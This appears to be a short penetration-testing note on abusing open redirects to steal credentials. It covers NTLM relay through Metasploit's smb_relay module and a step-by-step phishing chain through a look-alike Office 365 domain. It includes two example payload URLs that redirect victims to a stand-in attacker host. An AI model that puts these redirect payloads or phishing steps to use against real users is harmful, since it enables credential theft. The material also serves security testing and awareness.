# Siphon Credentials

## NTLM Relay

An attacker could exploit an open redirect by combining Metasploit SMB relay and the open redirect flaw. The attacker would set up exploits/windows/smb/smb_relay on evil.com and redirect to \\evil.com\c$. When the redirect occurs, the victim will to try to open a network share and thus send over their windows credentials. This attack only works on victims that is using Internet Explorer.  
  
```
https://example.com/?u=\\<attacker_IP>\C$
```

## Phishing Redirect

When a user clicks a link in an email, they are taught to first hover the link and read where it goes. If the link points to a website they trust, it is very likely that they will follow the link. Only a really trained eye would react due to a redirection after clicking a trusted link. In fact, redirects are actually very common the case of authentication.  
  
This type of attack that you should be worried about that I mentioned in the introduction. An attack that is almost 100% success that we commonly use looks similarly to this:  
1. The victim gets an email saying "Alice shared a document with you"  
2. The email contains a link to `office365.com`.  
3. The victim clicks the link and gets redirected to `office365.secure.evil.com`. Note that the user is used to being redirected when authenticating due to Single-sign on features.
4. The victim fails to verify the final url and leaks his credentials.
5. The victim is then redirected to the real logon portal where they (presumibly) successfully log in.
  
It is not only hard to detect the attack for the victim, but in many cases also for the blue team who tries to find the phishing email / patient zero from the bigger picture. For example:

```
https://example.com/?u=http[s]://<attacker_IP>/login
```
